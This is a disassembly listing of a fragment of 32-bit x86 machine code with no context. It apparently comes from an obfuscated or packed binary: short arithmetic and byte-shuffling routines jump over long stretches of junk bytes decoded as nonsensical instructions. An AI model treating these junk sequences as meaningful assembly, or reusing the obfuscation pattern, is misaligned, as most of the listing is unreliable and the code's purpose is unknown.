  40843c:	inc    edi
  40843d:	jmp    0x4083f2
  40843f:	adc    BYTE PTR [eax+0x69b64e3d],dh
  408445:	inc    edi
  408446:	int    0x46
  408448:	jge    0x40841d
  40844a:	inc    bp
  40844c:	sub    ch,cl
  40844e:	aas    
  40844f:	int3   
  408450:	adc    BYTE PTR [eax+esi*2],ah
  408453:	inc    ecx
  408454:	repz popf 
  408456:	xor    BYTE PTR [eax-0x58],cl
  408459:	cld    
  40845a:	cmc    
  40845b:	fucomp st(0)
  40845d:	jp     0x4083ed
  40845f:	push   0x58fc9a7e
  408464:	fnstenv [ebp+0x73]
  408467:	jno    0x408472
  408469:	push   ebp
  40846a:	call   0xbd69:0x38b76525
  408471:	push   esi
  408472:	xor    ch,bh
  408474:	xchg   ebp,ecx
  408476:	jo     0x408468
  408478:	hlt    
  408479:	fxch   st(6)
  40847b:	sar    dh,cl
  40847d:	clc    
  40847e:	xlat   BYTE PTR ds:[ebx]
  40847f:	outs   dx,BYTE PTR ds:[esi]
  408480:	mov    WORD PTR [edx-0x53],es
  408483:	push   ebx
  408484:	or     eax,0x6c96ae9a
  408489:	jge    0x4084a4
  40848b:	dec    esp
  40848c:	and    eax,DWORD PTR [eax]
  40848e:	mov    ebp,0xef5dc690
  408493:	pusha  
  408494:	jb     0x40850e
  408496:	dec    ecx
  408497:	iret   
  408498:	call   0xf3ee237f
  40849d:	xor    dh,BYTE PTR [edi+ebx*4+0x2a]
  4084a1:	cmp    ch,ah
  4084a3:	popa   
  4084a4:	jmp    0x5ce4:0x20fce0f9
  4084ab:	push   ebp
  4084ac:	scas   al,BYTE PTR es:[edi]
  4084ad:	ret    
  4084ae:	imul   esp,DWORD PTR ds:0x3fc157ff,0x62af4d9f
  4084b8:	mov    bl,0x40
  4084ba:	call   0x7f5e:0xfde06a29
  4084c1:	or     eax,0x7baea262
  4084c6:	jmp    0x33f4:0xa1f97e29
  4084cd:	mov    bh,0x5c
  4084cf:	sub    al,0xb3
  4084d1:	mov    ds:0x58e99354,eax
  4084d6:	shr    BYTE PTR [ebx+0x41],1
  4084d9:	mov    al,0xbc
  4084db:	jmp    0xa7afeead
  4084e0:	and    al,0xc3
  4084e2:	xchg   edx,eax
  4084e3:	icebp  
  4084e4:	mov    edi,0xb09af1a1
  4084e9:	mov    ah,0x8a
  4084eb:	xor    edi,edx
  4084ed:	mov    al,ds:0xfc62c8bb
  4084f2:	and    eax,0x1530b18d
  4084f7:	mov    ds:0x3fa6d6b3,al
  4084fc:	xchg   ecx,eax
  4084fd:	out    dx,al
  4084fe:	sbb    eax,0x3bf5f2
  408503:	cmp    BYTE PTR [ebp+0x57],dh
  408506:	sbb    ch,BYTE PTR [edx+0x345063d2]
  40850c:	hlt    
  40850d:	sbb    DWORD PTR ds:0x76abc141,edi
  408513:	cwde   
  408514:	scas   al,BYTE PTR es:[edi]
  408515:	cmp    eax,0x66319f2f
  40851a:	push   edx
  40851b:	lods   eax,DWORD PTR ds:[esi]
  40851c:	outs   dx,BYTE PTR ds:[esi]
  40851d:	cld    
  40851e:	lds    edi,FWORD PTR [eax+0x67]
  408521:	xor    ch,BYTE PTR ds:0x3ba3ff5c
  408527:	in     eax,0x67
  408529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40852a:	or     DWORD PTR [eax-0x1066f26],0xca74beef
  408534:	test   eax,0x9ea33dd6
  408539:	mov    al,ds:0xd56e4d37
  40853e:	add    ecx,DWORD PTR [esi-0x6fff6344]
  408544:	xchg   ebp,eax
  408545:	jecxz  0x408592
  408547:	test   al,0x97
  408549:	mov    al,BYTE PTR [esi]
  40854b:	and    eax,0xd4e14c90
  408550:	scas   al,BYTE PTR es:[edi]
  408551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408552:	(bad)  
  408553:	lods   eax,DWORD PTR ds:[esi]
  408554:	mov    edx,0xc8ccf050
  408559:	dec    ebp
  40855a:	pop    ebx
  40855b:	out    dx,al
  40855c:	push   cs
  40855d:	(bad)  [ebx+ecx*4+0x63]
  408561:	mov    ds:0xa8aa1749,eax
  408566:	mov    edi,ebx
  408568:	push   esi
  408569:	fcom   QWORD PTR [ecx]
  40856b:	stos   DWORD PTR es:[edi],eax
  40856c:	lds    eax,FWORD PTR [eax]
  40856e:	add    bh,BYTE PTR [ecx-0x71]
  408571:	jno    0x4085ed
  408573:	push   0xffffffdf
  408575:	loop   0x408559
  408577:	retf   
  408578:	shl    DWORD PTR [edi+0x2e],1
  40857b:	xchg   esi,eax
  40857c:	mov    edi,0x2dba195c
  408581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408582:	pop    esi
  408583:	mov    bh,0xa9
  408585:	inc    ecx
  408586:	sti    
  408587:	jge    0x4085c4
  408589:	fimul  DWORD PTR [edi]
  40858b:	xchg   DWORD PTR [eax],ecx
  40858d:	add    BYTE PTR [eax],al
  40858f:	add    BYTE PTR [ebx-0x271633ab],cl
  408595:	add    DWORD PTR [eax],eax
  408597:	add    BYTE PTR [ebx+0x7d8bc455],cl
  40859d:	cld    
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0x9460353f
  4085c4:	mov    ecx,0x7ed7e131
  4085c9:	jle    0x408555
  4085cb:	jg     0x40864b
  4085cd:	jle    0x4085ec
  4085cf:	retf   
  4085d0:	fst    QWORD PTR [esi-0x1b26919]
  4085d6:	(bad)  
  4085d7:	mov    dh,BYTE PTR [edx+0x7d724fb]
  4085dd:	sti    
  4085de:	(bad)  
  4085df:	pop    edi
  4085e0:	mov    dl,0x9f
  4085e2:	adc    DWORD PTR [edx-0x59d497b3],ecx
  4085e8:	add    al,0xc5
  4085ea:	and    edx,DWORD PTR [esi+esi*1-0x40]
  4085ee:	les    ebp,FWORD PTR [esi+0x5282395]
  4085f4:	and    esp,DWORD PTR [ecx-0x1202407e]
  4085fa:	sahf   
  4085fb:	aad    0x2a
  4085fd:	in     al,dx
  4085fe:	out    dx,al
  4085ff:	pop    eax
  408600:	in     ax,dx
  408602:	sbb    BYTE PTR [edi],bh
  408604:	inc    ecx
  408605:	mov    ch,bh
  408607:	adc    BYTE PTR [ebp+0x70601878],dh
  40860d:	imul   edx,DWORD PTR [eax-0x1f9bebd7],0xfffffff3
  408614:	and    ebp,DWORD PTR [edi]
  408616:	dec    edi
  408617:	out    0x74,eax
  408619:	xchg   ebp,eax
  40861a:	push   esi
  40861b:	loopne 0x40865c
  40861d:	out    dx,al
  40861e:	out    dx,al
  40861f:	xor    ebp,DWORD PTR [ebp-0x1bbd90fe]
  408625:	js     0x40861b
  408627:	xchg   BYTE PTR [esi+0x19],cl
  40862a:	test   DWORD PTR [edi+0x41],ebx
  40862d:	mov    DWORD PTR ds:0xa061dc31,ebx
  408633:	(bad)
  408637:	sti    
  408638:	in     eax,dx
  408639:	or     DWORD PTR [ebx+0x8],esi
  40863c:	sub    DWORD PTR [eax-0x80],edx
  40863f:	push   es
  408640:	cmp    ebp,ecx
  408642:	xor    ah,BYTE PTR [esi-0x11]
  408645:	cmp    al,0xc6
  408647:	into   
  408648:	mov    edi,DWORD PTR [edx-0x5c2313b2]
  40864e:	dec    edi
  40864f:	rcr    DWORD PTR ds:0x1104c785,1
  408655:	mov    bh,0x73
  408657:	cmp    BYTE PTR [ebp-0x16],0x2a
  40865b:	mov    ebx,0xa9f02731
  408660:	dec    ebx
  408661:	test   DWORD PTR [ecx-0x52],eax
  408664:	jns    0x408628
  408666:	mov    cl,0x3f
  408668:	jmp    0x89c573d5
  40866d:	xor    cl,BYTE PTR [ebp-0x7c484bd8]
  408673:	pop    esi
  408674:	repnz leave 
  408676:	jns    0x4086a1
  408678:	xor    DWORD PTR [ebp+0x59],esp
  40867b:	stc    
  40867c:	ins    BYTE PTR es:[edi],dx
  40867d:	loopne 0x40862a
  40867f:	ds mov edi,0x385cc7d4
  408685:	dec    esp
  408686:	mov    es,WORD PTR [esi+0x4a84780a]
  40868c:	push   ecx
  40868d:	fucomip st,st(5)
  408690:	outs   dx,DWORD PTR ds:[esi]
  408691:	xlat   BYTE PTR ds:[ebx]
  408692:	push   esi
  408693:	pop    ss
  408694:	mov    ah,ah
  408696:	aam    0x60
  408698:	dec    edx
  408699:	lods   eax,DWORD PTR ds:[esi]
  40869a:	mov    ds:0xaec6ca10,eax
  40869f:	jg     0x4086d3
  4086a1:	lahf   
  4086a2:	loopne 0x4086f6
  4086a4:	push   ss
  4086a5:	repz mov ebp,0xf112201d
  4086ab:	xchg   edx,eax
  4086ac:	push   ebp
  4086ad:	fldcw  WORD PTR [esi]
  4086af:	mov    edi,0x95e0fcb9
  4086b4:	push   0xe
  4086b6:	sbb    al,0x34
  4086b8:	sahf   
  4086b9:	jb     0x4086e7
  4086bb:	xor    esp,ebp
  4086bd:	stc    
  4086be:	repz (bad) 
  4086c0:	sbb    edi,DWORD PTR [ebp-0x8]
  4086c3:	or     al,0x54
  4086c5:	push   ebp
  4086c6:	dec    ebp
  4086c7:	pop    eax
  4086c8:	mov    ebp,esi
  4086ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086cb:	stos   BYTE PTR es:[edi],al
  4086cc:	and    eax,0xd4bd495a
  4086d1:	loop   0x40872e
  4086d3:	sbb    BYTE PTR [esi],dl
  4086d5:	or     BYTE PTR [esi+ecx*8+0x6f],ah
  4086d9:	addr16 xchg esi,eax
  4086db:	(bad)  
  4086dc:	aad    0x23
  4086de:	jns    0x40868c
  4086e0:	xchg   esp,eax
  4086e1:	out    dx,al
  4086e2:	and    al,0xc5
  4086e4:	pop    ss
  4086e5:	test   al,0x9b
  4086e7:	int3   
  4086e8:	je     0x40869c
  4086ea:	cmp    DWORD PTR [ecx+0x71],esp
  4086ed:	in     al,0x90
  4086ef:	lds    esi,FWORD PTR [edx]
  4086f1:	test   edi,ebx
  4086f3:	xor    DWORD PTR [ecx+0x4687af2f],ecx
  4086f9:	cmp    ah,BYTE PTR [esi-0x647a6180]
  4086ff:	fiadd  WORD PTR [edi+0x12]
  408702:	dec    esi
  408703:	mov    es,WORD PTR [edx]
  408705:	enter  0x784b,0xb3
  408709:	pop    edi
  40870a:	jl     0x40869d
  40870c:	jns    0x4086cb
  40870e:	int    0x7a
  408710:	mov    esi,0x5569250a
  408715:	or     edx,DWORD PTR [edi-0x38]
  408718:	add    al,0x80
  40871a:	jo     0x408786
  40871c:	xchg   ecx,eax
  40871d:	cwde   
  40871e:	daa    
  40871f:	aaa    
  408720:	adc    eax,0x590a418f
  408725:	lods   eax,DWORD PTR ds:[esi]
  408726:	xchg   esi,eax
  408727:	mov    dl,0x69
  408729:	bound  ecx,QWORD PTR [edi+0x26]
  40872c:	ret    
  40872d:	in     al,dx
  40872e:	fdiv   DWORD PTR [edx]
  408730:	popa   
  408731:	xchg   BYTE PTR [eax-0x29],cl
  408734:	ror    BYTE PTR [esi+0x3e],1
  408737:	inc    ebx
  408738:	out    0x67,al
  40873a:	inc    edi
  40873b:	mov    al,ds:0xc5f6b7d2
  408740:	(bad)  
  408742:	out    0xbc,eax
  408744:	sub    eax,0x6cc31379
  408749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40874a:	jo     0x40877c
  40874c:	or     eax,DWORD PTR [edi]
  40874e:	mov    bh,0xe2
  408750:	int3   
  408751:	dec    esi
  408752:	mov    WORD PTR [esi],ds
  408754:	loop   0x4087a6
  408756:	out    dx,eax
  408757:	(bad)  
  408759:	jmp    0xf2b2:0xaee733d5
  408760:	push   eax
  408761:	mov    DWORD PTR [ebx],edi
  408763:	fimul  DWORD PTR [ebx-0x79f037ab]
  408769:	add    eax,DWORD PTR [eax]
  40876b:	add    BYTE PTR [eax],al
  40876d:	mov    edx,DWORD PTR [ebp-0x3c]
  408770:	mov    edi,DWORD PTR [ebp-0x4]
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	sahf   
  408848:	loop   0x4088b6
  40884a:	jecxz  0x4088c9
  40884c:	aad    0x7e
  40884e:	jle    0x4087da
  408850:	jg     0x4088d0
  408852:	jle    0x408896
  408854:	jns    0x4088cd
  408856:	les    eax,FWORD PTR [edx+0x1400ebbe]
  40885c:	loop   0x408849
  40885e:	mov    esi,ecx
  408860:	(bad)  
  408862:	push   edi
  408863:	leave  
  408864:	repnz fsubr DWORD PTR [ecx-0x5479006a]
  40886b:	pusha  
  40886c:	sbb    ah,BYTE PTR [eax+0x67]
  40886f:	push   cs
  408870:	out    0x65,al
  408872:	leave  
  408873:	iret   
  408874:	(bad)  
  408875:	cli    
  408876:	enter  0xb949,0x78
  40887a:	add    dl,al
  40887c:	adc    al,0x19
  40887e:	iret   
  40887f:	xlat   BYTE PTR ds:[ebx]
  408880:	or     ch,BYTE PTR [edx-0x2d]
  408883:	popf   
  408884:	cmc    
  408885:	not    BYTE PTR [edi]
  408887:	data16 loop 0x4088cc
  40888a:	and    eax,0x2e980fd1
  40888f:	pushf  
  408890:	jno    0x4088b7
  408892:	jecxz  0x408903
  408894:	out    dx,eax
  408895:	and    esp,0x6a8b8781
  40889b:	mov    al,0x6
  40889d:	hlt    
  40889e:	bnd jne 0x40891a
  4088a1:	ficom  DWORD PTR [ecx+ebx*1-0x25fa4729]
  4088a8:	cmp    eax,0xa13dcfeb
  4088ad:	(bad)  
  4088ae:	dec    ecx
  4088af:	inc    eax
  4088b0:	mov    ch,0x3e
  4088b2:	sahf   
  4088b3:	cmp    al,0x85
  4088b5:	ds daa 
  4088b7:	dec    eax
  4088b8:	jp     0x408843
  4088ba:	sti    
  4088bb:	cmp    BYTE PTR [eax],ch
  4088bd:	ss scas eax,DWORD PTR es:[edi]
  4088bf:	into   
  4088c0:	ret    
  4088c1:	inc    ebx
  4088c2:	aaa    
  4088c3:	into   
  4088c4:	push   edi
  4088c5:	xor    edx,DWORD PTR [edx]
  4088c7:	ja     0x4088cd
  4088c9:	or     eax,0x82b945b2
  4088ce:	push   es
  4088cf:	mov    edx,DWORD PTR ds:0xe580d1e6
  4088d5:	add    al,0x75
  4088d7:	popf   
  4088d8:	jnp    0x4088e5
  4088da:	and    al,0x6b
  4088dc:	hlt    
  4088dd:	sub    bh,bh
  4088df:	out    0x67,al
  4088e1:	ins    BYTE PTR es:[edi],dx
  4088e2:	cmp    al,bl
  4088e4:	jo     0x4088ab
  4088e6:	pop    esi
  4088e7:	add    dh,BYTE PTR [edi+ebx*2-0x61c4364e]
  4088ee:	push   edx
  4088ef:	and    al,0xf
  4088f1:	fisubr DWORD PTR [eax+0x60]
  4088f4:	shl    DWORD PTR ss:[ecx-0x70],1
  4088f8:	mov    DWORD PTR ds:0xa38f68cd,edx
  4088fe:	in     al,0xba
  408900:	in     al,dx
  408901:	jns    0x408955
  408903:	or     DWORD PTR [edx],0x6e
  408906:	sbb    DWORD PTR [eax-0x78],ebp
  408909:	push   esp
  40890a:	xchg   ebp,eax
  40890b:	fs loope 0x40891a
  40890e:	test   edi,edi
  408910:	adc    BYTE PTR [edi-0x5b],ch
  408913:	iret   
  408914:	mov    eax,ds:0x5f632279
  408919:	div    DWORD PTR [ebx]
  40891b:	lahf   
  40891c:	inc    esi
  40891d:	adc    ch,BYTE PTR [esi]
  40891f:	jae    0x40898e
  408921:	push   cs
  408922:	icebp  
  408923:	les    esp,FWORD PTR ds:0xb473d48
  408929:	mov    al,ds:0x2f0ea7ae
  40892e:	sub    BYTE PTR [edi-0x4d],bl
  408931:	cmp    cl,bh
  408933:	fidiv  WORD PTR [esi+0x2]
  408936:	div    edx
  408938:	js     0x4088d3
  40893a:	mov    dh,ch
  40893c:	test   al,0x65
  40893e:	fnstenv [ecx+0x7d]
  408941:	or     eax,0xaf816786
  408946:	fwait
  408947:	enter  0xebec,0x5a
  40894b:	xor    cl,BYTE PTR [edi+edi*4+0x59]
  40894f:	daa    
  408950:	cld    
  408951:	or     BYTE PTR [eax],al
  408953:	sti    
  408954:	pop    ebp
  408955:	xor    ebx,esi
  408957:	mov    bl,0x7c
  408959:	sub    bl,dh
  40895b:	xlat   BYTE PTR ds:[ebx]
  40895c:	sbb    eax,0x23238858
  408961:	gs and eax,0x10fac938
  408967:	xchg   ebx,eax
  408968:	jg     0x40891b
  40896a:	xchg   esi,eax
  40896b:	mov    ecx,0xf6e107cc
  408970:	xchg   edi,edx
  408972:	rcl    bh,1
  408974:	jno    0x4089af
  408976:	fcmovnbe st,st(7)
  408978:	arpl   WORD PTR [eax-0x57d4e575],bx
  40897e:	das    
  40897f:	lock mov esp,0x377d3ff4
  408985:	pop    ds
  408986:	push   ecx
  408987:	dec    esp
  408988:	scas   eax,DWORD PTR es:[edi]
  408989:	jge    0x4089ab
  40898b:	test   bl,dh
  40898d:	stos   DWORD PTR es:[edi],eax
  40898e:	xor    DWORD PTR [ecx],0x7fa455bd
  408994:	jo     0x40896c
  408996:	pop    ss
  408997:	add    al,bl
  408999:	ds ins BYTE PTR es:[edi],dx
  40899b:	sbb    al,0x69
  40899d:	mov    ?,WORD PTR [edi]
  40899f:	ins    BYTE PTR es:[edi],dx
  4089a0:	jo     0x4089c7
  4089a2:	in     eax,0x76
  4089a4:	jbe    0x4089e8
  4089a6:	adc    BYTE PTR [esi],dl
  4089a8:	mov    ebx,0x5b010529
  4089ad:	xor    al,0xb7
  4089af:	pop    edi
  4089b0:	js     0x40894a
  4089b2:	idiv   DWORD PTR [edx+esi*8-0x4f]
  4089b6:	jmp    0x3c529ae3
  4089bb:	push   0x7fe46ca
  4089c0:	test   cl,ch
  4089c2:	jo     0x408998
  4089c4:	inc    DWORD PTR [edx-0xf]
  4089c7:	pop    eax
  4089c8:	loop   0x408955
  4089ca:	pop    ds
  4089cb:	pop    es
  4089cc:	jno    0x408a2b
  4089ce:	(bad)  
  4089cf:	fdivp  st(6),st
  4089d1:	stos   DWORD PTR es:[edi],eax
  4089d2:	add    DWORD PTR [edx+0x78],ebp
  4089d5:	out    0x6d,eax
  4089d7:	lahf   
  4089d8:	fwait
  4089d9:	push   ecx
  4089da:	inc    ebx
  4089db:	mov    BYTE PTR [edx-0x65],ch
  4089de:	xchg   edi,eax
  4089df:	in     eax,dx
  4089e0:	jb     0x408a28
  4089e2:	jae    0x408a3d
  4089e4:	sbb    DWORD PTR [edi+0x3f833f0],ebx
  4089ea:	stc    
  4089eb:	imul   edi,ebx
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	mov    dh,BYTE PTR [eax-0x2d7641d0]
  408a0c:	jle    0x408a8c
  408a0e:	mov    bh,BYTE PTR [edi+0x7e]
  408a11:	jle    0x4089bc
  408a13:	pop    eax
  408a14:	call   0xe0d6433b
  408a19:	enter  0x99e2,0x3
  408a1d:	imul   DWORD PTR [esi]
  408a1f:	add    bl,BYTE PTR [ebx]
  408a21:	lods   al,BYTE PTR ds:[esi]
  408a22:	cmp    al,0x6c
  408a24:	fst    DWORD PTR [eax+edx*4-0x50]
  408a28:	lds    edi,FWORD PTR [esi+0x7e]
  408a2b:	mov    ebp,0xd10c12ad
  408a30:	pavgw  mm0,QWORD PTR [ecx]
  408a33:	fdivrp st(7),st
  408a35:	push   ss
  408a36:	(bad)  
  408a37:	adc    al,BYTE PTR [eax+0x36]
  408a3a:	mov    esi,DWORD PTR [ebx+0x26435cfc]
  408a40:	dec    edx
  408a41:	push   ss
  408a42:	aam    0x6f
  408a44:	inc    esp
  408a45:	ins    DWORD PTR es:[edi],dx
  408a46:	shl    BYTE PTR [eax+0x16],0xd
  408a4a:	pop    ebp
  408a4b:	mov    edi,0x86b784d4
  408a50:	cmp    eax,0x585d92a6
  408a55:	cmp    edx,DWORD PTR [edx+0xe291dd6]
  408a5b:	sub    dl,dl
  408a5d:	mov    bh,0xb6
  408a5f:	fcmove st,st(4)
  408a61:	cmp    dh,BYTE PTR [edx+0x56aa0dce]
  408a67:	in     eax,0x64
  408a69:	shr    DWORD PTR [ebp-0x20bd981a],0x8c
  408a70:	fcom   DWORD PTR [edx-0x4d2c5ceb]
  408a76:	sub    DWORD PTR [esi-0x3b114b04],eax
  408a7c:	mov    edi,0xfb154d98
  408a81:	call   0x288c1bb8
  408a86:	aas    
  408a87:	jg     0x408a86
  408a89:	jmp    0x408a15
  408a8b:	cs push ebx
  408a8d:	push   esp
  408a8e:	int    0x1e
  408a90:	mov    ebp,0x9c01ddc2
  408a95:	or     BYTE PTR [edx+0x268e2e29],bh
  408a9b:	fcomip st,st(7)
  408a9d:	sti    
  408a9e:	enter  0x6b6a,0xca
  408aa2:	xchg   esi,eax
  408aa3:	jne    0x408ad2
  408aa5:	call   0x69245f78
  408aaa:	(bad)  
  408aac:	add    al,0xec
  408aae:	inc    edx
  408aaf:	mov    dh,bh
  408ab1:	jle    0x408a81
  408ab3:	cmp    DWORD PTR [edi+0x60],0x96499090
  408aba:	mov    eax,ds:0xd0c9fd35
  408abf:	adc    ecx,esp
  408ac1:	add    ah,BYTE PTR [edx]
  408ac3:	daa    
  408ac4:	jno    0x408a99
  408ac6:	loopne 0x408a91
  408ac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ac9:	adc    dh,BYTE PTR [ebp+ebp*8+0x2aad9734]
  408ad0:	div    al
  408ad2:	mov    eax,ds:0x961b2270
  408ad7:	dec    edi
  408ad8:	ret    0x2c74
  408adb:	jmp    0x5533:0xe957c7b0
  408ae2:	inc    esp
  408ae3:	dec    esi
  408ae4:	or     esi,DWORD PTR [edx-0x2]
  408ae7:	dec    eax
  408ae8:	cli    
  408ae9:	loope  0x408ac6
  408aeb:	and    eax,esi
  408aed:	push   eax
  408aee:	xor    BYTE PTR [esi-0x7364ac0d],ah
  408af4:	jbe    0x408ae7
  408af6:	push   0x1e
  408af8:	push   ecx
  408af9:	mov    edx,0x5edbe301
  408afe:	inc    esp
  408aff:	jo     0x408aba
  408b01:	or     eax,0x58eea09b
  408b06:	dec    edi
  408b07:	lahf   
  408b08:	call   0xc233:0xd20971a4
  408b0f:	dec    ebx
  408b10:	push   0xffffff90
  408b12:	pop    es
  408b13:	push   eax
  408b14:	add    bh,ah
  408b16:	adc    al,0xc9
  408b18:	hlt    
  408b19:	cwde   
  408b1a:	outs   dx,BYTE PTR ds:[esi]
  408b1b:	(bad)
  408b1e:	sub    al,0xdf
  408b20:	cs pop ecx
  408b22:	mov    edx,0x7f80b780
  408b27:	mov    bl,BYTE PTR [eax+edi*8+0x3c0133fd]
  408b2e:	shl    ch,0x78
  408b31:	mov    ds:0x6227df09,eax
  408b36:	cmc    
  408b37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b38:	dec    edx
  408b39:	xchg   ebp,eax
  408b3a:	jbe    0x408af2
  408b3c:	adc    DWORD PTR [edx],edi
  408b3e:	or     BYTE PTR [edx],ah
  408b40:	dec    ebp
  408b41:	ffreep st(2)
  408b43:	out    0x5b,eax
  408b45:	test   BYTE PTR [ecx+0x3a329d30],0xa5
  408b4c:	cwde   
  408b4d:	add    eax,0x4ccb483c
  408b52:	xor    edi,DWORD PTR [edi]
  408b54:	jecxz  0x408b26
  408b56:	push   cs
  408b57:	dec    ecx
  408b58:	dec    ecx
  408b59:	push   edx
  408b5a:	pop    esi
  408b5b:	sub    ebp,ebx
  408b5d:	or     BYTE PTR [eax],0x8b
  408b60:	push   ebx
  408b61:	dec    esp
  408b62:	icebp  
  408b63:	dec    eax
  408b64:	jbe    0x408bdc
  408b66:	add    al,al
  408b68:	fimul  WORD PTR [ecx-0x3de03cc]
  408b6e:	or     BYTE PTR [eax-0x5267bcd7],dl
  408b74:	xchg   ebx,eax
  408b75:	xor    ebp,DWORD PTR [edi-0x207f73ca]
  408b7b:	sub    dl,BYTE PTR [esi+0x1e785058]
  408b81:	jno    0x408b6b
  408b83:	jle    0x408b32
  408b85:	dec    ecx
  408b86:	mov    ds:0xf4996da3,al
  408b8b:	popf   
  408b8c:	gs ins BYTE PTR es:[edi],dx
  408b8e:	pop    ebx
  408b8f:	inc    eax
  408b90:	popa   
  408b91:	mov    ebp,0xbb54ad14
  408b96:	mov    BYTE PTR [ebp-0x24],ch
  408b99:	stos   DWORD PTR es:[edi],eax
  408b9a:	sub    al,0x6
  408b9c:	add    al,cl
  408b9e:	add    al,0xdd
  408ba0:	inc    ebx
  408ba1:	sbb    edx,0x8d8cc46a
  408ba7:	mov    esp,0x32729b1f
  408bac:	add    BYTE PTR [ebx],bh
  408bae:	cli    
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	mov    esi,0x25915885
  408bdd:	sar    BYTE PTR [esi+0x7e],1
  408be0:	mov    bh,BYTE PTR [edi+0x7e]
  408be3:	jle    0x408c18
  408be5:	shl    BYTE PTR [edi+0x7f3c64ee],cl
  408beb:	test   eax,0xf5714b67
  408bf0:	in     al,0xc8
  408bf2:	jmp    0xe86f:0xa26e670d
  408bf9:	fs mov dh,0xc9
  408bfc:	cmp    al,0x12
  408bfe:	push   es
  408bff:	stos   DWORD PTR es:[edi],eax
  408c00:	mov    dh,BYTE PTR [ebx]
  408c02:	xchg   esp,eax
  408c03:	push   eax
  408c04:	test   eax,0x97eb6ce5
  408c09:	and    al,0xf9
  408c0b:	int    0x5a
  408c0d:	retf   
  408c0e:	push   esi
  408c0f:	jg     0x408bb8
  408c11:	jl     0x408c4b
  408c13:	and    al,0x4e
  408c15:	faddp  st(2),st
  408c17:	sbb    esp,DWORD PTR [ebx]
  408c19:	nop
  408c1a:	add    eax,0x98f0c086
  408c1f:	xchg   edi,eax
  408c20:	fucom  st(5)
  408c22:	pushf  
  408c23:	(bad)  
